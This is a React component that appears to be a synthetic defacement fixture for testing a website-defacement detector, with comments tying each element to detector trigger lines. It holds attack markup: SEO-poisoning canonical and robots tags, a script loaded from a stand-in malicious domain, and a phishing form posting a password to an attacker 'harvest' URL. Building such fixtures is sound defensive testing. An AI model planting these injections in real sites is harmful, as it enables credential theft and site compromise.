import React from 'react';

/**
 * MainContent - Layer 1 "Hard Trigger" Defacement
 * 
 * Strategy to hit DEFACED:
 * 1. SEO Poisoning (Hard Trigger): Changing Meta Robots and Canonical URL.
 * 2. Form Hijacking (Hard Trigger): Changing a form action to a cross-apex domain.
 * 3. Script Injection (Hard Trigger): Loading a script from a new, non-whitelisted domain.
 * 4. Calibrated TED: Using 400 nodes (staying below the 5,000-node compression cap)
 *    to ensure the Raw L1 score can reach 1.0 rather than being capped at 0.85.
 */
const MainContent = () => {
  return (
    <div className="defaced-root" id="layer1-pwned-zone">
      {/* 
          L1 HARD TRIGGER: Meta Tag Canonical Change 
          L1 HARD TRIGGER: Meta Tag Robots Change (SEO Poisoning)
          Logic: detector/layers/l1_structural.py (Line 362)
      */}
      <link rel="canonical" href="https://defaced-mirror.site/compromised" />
      <meta name="robots" content="noindex, nofollow" />

      {/* 
          L1 HARD TRIGGER: Script Injection (New Domain)
          Logic: detector/layers/l1_structural.py (Line 337)
      */}
      <script src="https://malicious-cdn.ru/payload.js" />

      <header className="hacked-header" style={{ backgroundColor: 'black', color: 'red', padding: '50px' }}>
        <h1 style={{ fontSize: '3rem' }}>SYSTEM OFFLINE</h1>
      </header>

      <div className="content-purge" style={{ padding: '30px' }}>
        <p>Your structural integrity has been totally compromised.</p>
        
        {/* 
            L1 HARD TRIGGER: Form Action Change 
            Logic: detector/layers/l1_structural.py (Line 300)
            Targeting "cross_apex" or "scheme_downgrade" triggers.
        */}
        <form action="https://attacker-data-collect.net/harvest" method="POST" style={{ margin: '40px 0', border: '2px dashed red', padding: '20px' }}>
          <h3>Security Verification</h3>
          <input type="password" placeholder="Enter Admin Pin" style={{ padding: '10px' }} />
          <button type="submit" style={{ backgroundColor: 'red', color: 'white', border: 'none', padding: '10px 20px' }}>
            Verify Identity
          </button>
        </form>
      </div>

      {/* 
          L1 STRUCTURAL DRIFT: 400 NODES 
          Staying under the 5,000 node cap (MAX_NODES) ensures that the TED calculation 
          returns a high dynamic score (approaching 1.0) instead of the 0.85 fallback.
      */}
      <div className="structural-noise" aria-hidden="true" style={{ opacity: 0, height: 0 }}>
        {Array.from({ length: 400 }).map((_, i) => (
          <section key={i} className={`anomaly-block-v4-${i}`}>
            <span id={`drift-id-${i}`}>STRUCTURAL_ENTROPY_ACTIVE</span>
          </section>
        ))}
      </div>

      <footer className="footer-void" style={{ textAlign: 'center', padding: '20px', borderTop: '5px solid red' }}>
        <b style={{ fontSize: '20px' }}>LAYER 1: TOTAL_TAKEOVER</b>
      </footer>
    </div>
  );
};

export default MainContent;
